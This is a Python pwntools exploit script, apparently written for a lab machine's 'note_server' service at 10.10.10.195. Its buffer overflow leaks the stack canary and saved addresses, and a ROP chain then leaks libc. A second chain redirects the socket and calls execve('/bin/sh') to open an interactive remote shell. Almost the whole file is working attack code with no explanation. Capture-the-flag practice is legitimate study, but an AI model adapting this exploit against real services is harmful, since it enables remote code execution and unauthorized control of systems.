from pwn import *
import time

host = '10.10.10.195'
port = 5001
context(os='linux', arch='amd64')
con = remote(host, port)

def deliv(data):
	con.send(p8(1))
	con.send(p8(len(data)))
	con.send(data)

def write_to(val=0):
	#g = cyclic()
	#x = 0
	if val == None:
		val = len(app_len)
	while val < 1024:
		#print("[+] x value is at: {}".format(str(x)))
		app_len = min(255, 1024 - val)
		app_data = cyclic(app_len)
		#print(app_data)
		#print("X AT {}".format(str(x)))
		#print("value: \n" + str(app_data) + '\n')
		#print(len((app_data)))
		deliv(app_data)
		val += app_len

def copy_to(offset, size):
	con.send(p8(2))
	con.send(p16(offset))
	con.send(p8(size))


def read_notes(size=0):
	if size == None:
		con.send(p8(3))
		data = con.recvall()
	else:
		con.send(p8(3))
		data = con.recv(size)
	return data

def rop(can, rbp, ropping):
	pad = p64(0xDEAD) #junk
	pad += p64(can) #encode canary
	pad += p64(rbp)
	pad += ropping.chain()
	deliv(pad)
	write_to(val=len(pad))
	copy_to(offset=0, size=len(pad))
	f = read_notes(1024 + len(pad))
	return f

# get canary, rbp, rip
write_to()
copy_to(1024, 32)
dedata = read_notes(1056)[1024:] # value

can = u64(dedata[8:16])

print("[+] CANARY AT: {}".format(str(hex(can))))

rbp = u64(dedata[16:24])

print("[+] RBP AT {}".format(str(hex(rbp))))

rip = u64(dedata[24:])

print("[+] RIP AT: {}".format(str(hex(rip))))
get_libc = rip - 0xf54 #address libc exit(0) and CHANGE ME
#print(hex(get_libc))
base_bin = ELF('./note_server', checksec=False) #CHANGE ME TO THE ORIGINAL BINARY FILE
base_bin.address = get_libc 
ropping = ROP(base_bin) 
ropping.write(4, base_bin.got['write'])
con = remote(host, port)
leny = rop(can, rbp, ropping)
lul = con.recv(8)
#con.recvall()
#print(len(leny))
libcc = u64(lul) #libcaddr
print("[+] Libc address: {}".format(str(hex(libcc))))
efi2 = ELF('./libc-2.27.so', checksec=False) #CHANGE ME TO THE ORIGINAL BINARY FILE
efi2.address = libcc - efi2.symbols['write']
rop2 = ROP(efi2)
rop2.dup2(4, 0)
rop2.dup2(4, 1)
rop2.execve(next(efi2.search(b"/bin/sh\x00")), 0, 0)
con = remote(host, port)
rop(can, rbp, ropping=rop2)
con.interactive()